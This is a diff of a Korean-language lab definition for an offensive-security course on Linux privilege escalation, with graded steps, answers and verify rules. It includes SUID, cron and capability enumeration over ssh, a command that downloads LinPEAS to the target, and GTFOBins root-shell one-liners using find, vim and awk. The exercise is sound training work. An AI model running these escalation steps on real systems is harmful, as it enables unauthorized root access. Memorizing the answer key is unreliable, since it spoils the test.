@@ -1,63 +1,143 @@
 lab_id: standalone-attack-week11
-title: Linux 권한 상승 (LinPEAS / SUID / cron)
+title: Linux 권한 상승 — LinPEAS / SUID / cron + R/B/P
 version: standalone-non-ai
 course: attack
 week: 11
-description: 5 카테고리 enum + LinPEAS + GTFOBins.
+description: |
+  attacker → bastion 사용자 권한 가정 → SUID/cron/capabilities/sudo 5 카테고리 enum +
+  GTFOBins 활용 + LinPEAS 자동화.
 difficulty: medium
 duration_minutes: 150
 prerequisites: [W10]
-objectives: [enum, SUID, cron, capabilities]
+objectives: ["5 카테고리 enum", "GTFOBins 활용", "LinPEAS 자동화"]
 pass_threshold: 0.7
 steps:
+
   - order: 1
-    instruction: 5 카테고리 수동 enum
-    hint: id; sudo -l; find / -perm -4000
+    instruction: |
+      ## 🎯 MISSION
+
+      bastion 의 ccc 사용자 권한으로 **5 카테고리 enum** — sudo / SUID / cron /
+      capabilities / world-writable.
+
+      ## 💻 실행 명령
+
+      ```bash
+      ssh 6v6-bastion '
+      echo "=== sudo -l ==="
+      sudo -l 2>&1 | head -5
+      echo "=== SUID binary ==="
+      find / -perm -4000 -type f 2>/dev/null | head -10
+      echo "=== capabilities ==="
+      getcap -r / 2>/dev/null | head -5
+      echo "=== cron ==="
+      cat /etc/crontab 2>/dev/null; ls /etc/cron.d/ 2>/dev/null
+      echo "=== world-writable ==="
+      find / -perm -002 -type f 2>/dev/null | head -5
+      '
+      ```
+
+      ## 📋 확인 사항
+
+      - sudo -l: 학습 환경의 ccc NOPASSWD 표시
+      - SUID 10개+ (sudo / su / passwd / ping 등)
+      - capabilities 일부 (cap_net_raw 등)
+      - cron 표준 entry
+      - world-writable 시스템 파일 (예상 외)
+
+      ## 💡 왜 이걸 하는가?
+
+      PTES 6 단계 — Post Exploitation. 사용자 권한 → root 권한 상승의 표준 enum.
+
+      ## 🔍 결과 해석
+
+      - **정상**: 5 카테고리 표준 결과
+      - **권한 상승 후보**: 예상 외 SUID / 비표준 capabilities / writable cron
+    hint: 5 카테고리 enum
     category: enumeration
     points: 30
     answer: |
-      ssh 6v6-bastion 'echo "--- id ---"; id; echo "--- sudo -l ---"; sudo -l 2>&1 | head; echo "--- SUID ---"; find / -perm -4000 -type f 2>/dev/null | head -10; echo "--- caps ---"; getcap -r / 2>/dev/null | head -5; echo "--- cron ---"; cat /etc/crontab; ls /etc/cron.d/ 2>/dev/null'
-    answer_detail: 5 카테고리 enum
-    verify:
-      type: output_contains
-      expect: ccc
-      field: stdout
-      semantic:
-        intent: enum
-        success_criteria: [SUID + cron + caps]
-        acceptable_methods:
-          - "**[OSS] id + sudo -l**"
-          - "**[OSS] find -perm -4000 SUID**"
-          - "**[OSS] getcap -r capabilities**"
-          - "**[OSS] /etc/crontab + cron.d**"
-          - "**[OSS] /etc/passwd / shadow**"
-          - "**[OSS] ssh authorized_keys**"
-          - "**[OSS] systemd unit files**"
-          - "**[OSS] world-writable files (find -perm -002)**"
-    target_vm: bastion
-
-  - order: 2
-    instruction: GTFOBins 활용 시뮬
-    hint: find . -exec /bin/sh \;
-    category: exploit
-    points: 25
-    answer: |
-      ssh 6v6-bastion 'echo "--- SUID binary 중 GTFOBins ---"; for b in $(find / -perm -4000 -type f 2>/dev/null | head -5); do echo "$b"; done; echo "--- 가설: vim/find/awk SUID 시 root shell 가능 ---"'
-    answer_detail: SUID + GTFOBins 검토
+      ssh 6v6-bastion '
+      echo "=== sudo -l ==="; sudo -l 2>&1 | head -5
+      echo "=== SUID ==="; find / -perm -4000 -type f 2>/dev/null | head -10
+      echo "=== capabilities ==="; getcap -r / 2>/dev/null | head -5
+      echo "=== cron ==="; cat /etc/crontab 2>/dev/null; ls /etc/cron.d/ 2>/dev/null
+      echo "=== world-writable ==="; find / -perm -002 -type f 2>/dev/null | head -5
+      '
+    answer_detail: 5 카테고리 권한 상승 enum.
     verify:
       type: output_contains
       expect: SUID
       field: stdout
       semantic:
-        intent: GTFOBins
-        success_criteria: [SUID 분석]
+        intent: "5 카테고리 enum"
+        success_criteria: ["5 카테고리 출력"]
         acceptable_methods:
-          - "**[OSS] gtfobins.github.io 검색**"
+          - "**[OSS] sudo -l (NOPASSWD entry)**"
+          - "**[OSS] find -perm -4000 SUID**"
+          - "**[OSS] getcap -r capabilities**"
+          - "**[OSS] /etc/crontab + cron.d**"
+          - "**[OSS] /etc/passwd / shadow 권한**"
+          - "**[OSS] ssh authorized_keys**"
+          - "**[OSS] systemd unit + timer**"
+          - "**[OSS] kernel exploit (searchsploit linux kernel)**"
+    target_vm: bastion
+
+  - order: 2
+    instruction: |
+      ## 🎯 MISSION
+
+      **LinPEAS 자동화** 시뮬 + GTFOBins 활용 시나리오.
+
+      ## 💻 실행 명령
+
+      ```bash
+      # LinPEAS 다운로드 (실 실행은 5분+ 소요 — 시뮬)
+      ssh 6v6-bastion 'curl -sL https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/linPEAS/linpeas.sh -o /tmp/linpeas.sh 2>&1 | head -3'
+      ssh 6v6-bastion 'ls -la /tmp/linpeas.sh 2>/dev/null'
+
+      # GTFOBins 시뮬 — find SUID 가 있다면 root shell 가능
+      ssh 6v6-bastion 'ls -la /usr/bin/find /usr/bin/vim /usr/bin/awk 2>/dev/null | head -3'
+      echo "GTFOBins 활용: find . -exec /bin/sh \\; (find 가 SUID 일 때)"
+      ```
+
+      ## 📋 확인 사항
+
+      - LinPEAS 다운로드 (실 실행은 별 lab)
+      - find / vim / awk 의 permission (SUID 여부)
+      - GTFOBins 명령 예시 인지
+
+      ## 💡 왜 이걸 하는가?
+
+      LinPEAS 는 5 카테고리 + 100+ 점검 자동화. GTFOBins (https://gtfobins.github.io)
+      는 SUID 활용 표준 cheat sheet.
+
+      ## 🔍 결과 해석
+
+      - **정상**: LinPEAS 다운로드 성공
+      - **권한 상승**: SUID find → `find . -exec /bin/sh \;` 로 root shell
+    hint: LinPEAS + GTFOBins
+    category: exploit
+    points: 25
+    answer: |
+      ssh 6v6-bastion 'curl -sL https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/linPEAS/linpeas.sh -o /tmp/linpeas.sh 2>&1 | head -3'
+      ssh 6v6-bastion 'ls -la /tmp/linpeas.sh 2>/dev/null'
+      ssh 6v6-bastion 'ls -la /usr/bin/find /usr/bin/vim /usr/bin/awk 2>/dev/null | head -3'
+    answer_detail: LinPEAS 다운로드 + GTFOBins 활용 시뮬.
+    verify:
+      type: output_contains
+      expect: linpeas
+      field: stdout
+      semantic:
+        intent: "LinPEAS + GTFOBins"
+        success_criteria: ["LinPEAS 다운로드"]
+        acceptable_methods:
+          - "**[OSS] LinPEAS / WinPEAS**"
+          - "**[OSS] PEASS-ng (모던 fork)**"
+          - "**[OSS] GTFOBins SUID cheat sheet**"
           - "**[OSS] vim -c ':!/bin/sh'**"
           - "**[OSS] find . -exec /bin/sh \\;**"
-          - "**[OSS] awk system()**"
-          - "**[OSS] python -c 'os.system'**"
-          - "**[OSS] tar checkpoint-action**"
-          - "**[OSS] nmap --interactive**"
+          - "**[OSS] awk 'BEGIN{system(\"/bin/sh\")}'**"
           - "**[OSS] sudo + GTFOBins 결합**"
+          - "**[OSS] T1548.001 setuid/setgid**"
     target_vm: bastion
